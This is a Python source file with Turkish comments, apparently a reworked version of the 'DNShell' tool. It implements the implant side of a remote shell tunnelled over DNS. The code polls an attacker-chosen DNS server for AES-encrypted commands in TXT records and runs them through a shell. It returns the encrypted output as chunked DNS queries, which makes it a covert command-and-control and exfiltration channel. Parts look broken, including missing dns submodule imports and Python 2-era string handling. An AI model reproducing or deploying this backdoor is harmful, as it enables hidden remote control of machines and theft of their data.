# DNShell Server V1.7 Esinlenmesidir !
# https://github.com/muhammetalgan
from Crypto.Cipher import AES
import subprocess
import dns.resolver
import textwrap
import base64
import re
import logging
from optparse import OptionParser
import socket
from dotenv import load_dotenv
import os

# .env dosyasındaki çevre değişkenlerini yükleyin
load_dotenv()

# Anahtar ve IV'yi .env dosyasından okuyun
SECRET_KEY = os.getenv('SECRET_KEY')
IV = os.getenv('IV')

TLD = 'com'
NXT_CMD = 'nxt'
ANSWER = ';ANSWER'
TYPE = 'TXT'

# AES için 16, 24 veya 32 değeri kullanılabilir
BLOCK_SIZE = 32

# Dolgu için kullanılacak karakter
PADDING = '{'

# Metni yeterince dolduran tek satırlık bir lambda ifadesi
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# Rastgele bir anahtar ve IV kullanarak CBC şifreleme nesnesi oluşturuluyor
cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)

def encrypt(string):
    encoded = EncodeAES(cipher, string)
    return encoded

def decrypt(string):
    decoded = DecodeAES(cipher, string)
    return decoded

def formURL(cmd):
    return '{}.{}'.format(cmd, TLD)

def startConnection(host):
    # Komutları çalıştırmak için sahte DNS sunucusuna sorgu yapılıyor
    url = formURL(NXT_CMD)
    request = dns.message.make_query(url, dns.rdatatype.TXT)
    answers = dns.query.udp(request, host)
    return answers.to_text()

def parseCmd(response):
    cmd = ''
    answer = False
    for line in response.split("\n"):
        if answer:
            cmd = textwrap.dedent(line.split(TYPE)[-1]).strip('"')
            break
        if ANSWER in line:
            answer = True
    return cmd

def encodeB64Equals(output):
    # "=" işareti kaldırılıyor ve "=" gerektiğini belirtmek için "-" ekleniyor
    if output[-1] == "=":
        if output[-2] == "=":
            output = output[0] + "-" + output[1] + "-" + output[2:-2]
        else:
            output = output[0] + "-" + output[1:-1]
    return output

def processOutput(stdoutput):
    # Çıktı şifreleniyor
    eStdoutput = encrypt(stdoutput)
    # Çıktı verisi base64 ile kodlanıyor
    output = base64.b64encode(eStdoutput)
    output = encodeB64Equals(output)
    return output

def runCmd(cmd):
    # Yanıttan komut çıkarılıyor
    eNxtCmd = base64.b64decode(cmd)
    # Yanıt çözülüyor
    nxtCmd = decrypt(eNxtCmd)

    # Sunucu çıkış komutunu kontrol ediyoruz
    if nxtCmd == "quit":
        exit(0)

    try:
        # Execute server command
        proc = subprocess.Popen(nxtCmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()

        # Handle Directory Changes
        if re.match('^cd .*', nxtCmd):
            directory = nxtCmd.split('cd ')[-1]
            try:
                os.chdir(directory)
                stdoutput = os.getcwd()
            except:
                stdoutput = "Couldn't change directory to: {}".format(directory)
        
        output = processOutput(stdoutput)
        return output
    except subprocess.CalledProcessError as e:
        logging.error("Komut çalıştırma hatası: %s", e)
        return ""

def dnsMakeQuery(url, host):
    feedback_request = dns.message.make_query(url, dns.rdatatype.A)
    dns.query.udp(feedback_request, host)

def sendOutputToServer(output, host):
    send = ''
    for i, chunk in enumerate(output, 1):
        send += chunk
        # 58 karakterlik parçalar halinde gönderiliyor
        if i % 58 == 0:
            url = formURL(send)
            dnsMakeQuery(url, host)
            send = ''
    
    # Son parça gönderiliyor
    if send:
        url = formURL(send)
        dnsMakeQuery(url, host)

def validate_dns_server(server):
    try:
        socket.gethostbyname(server)
        return True
    except socket.error:
        return False

def start(host):
    while True:
        response = startConnection(host)
        cmd = parseCmd(response)
        stdoutput = runCmd(cmd)
        sendOutputToServer(stdoutput, host)

def main():
    # Komut satırı argümanlarını ayarlıyoruz
    optp = OptionParser()

    # Çıktı ayrıntısı seçenekleri
    optp.add_option('-q', '--quiet', help='set logging to ERROR', action='store_const', dest='loglevel', const=logging.ERROR, default=logging.INFO)
    optp.add_option('-d', '--debug', help='set logging to DEBUG', action='store_const', dest='loglevel', const=logging.DEBUG, default=logging.INFO)
    optp.add_option('-v', '--verbose', help='set logging to COMM', action='store_const', dest='loglevel', const=5, default=logging.INFO)

    # Belirli bir sunucuya sorgu yapma seçeneği
    optp.add_option("-s", "--server", dest="host", help="DNS server to query")

    opts, args = optp.parse_args()

    # Günlüğü yapılandırma
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')

    # Kullanıcıdan alınan sunucu adresini doğrulayın
    if not validate_dns_server(opts.host):
        print("Geçersiz DNS sunucusu adresi.")
        exit(1)

    start(opts.host)


if __name__ == '__main__':
    main()
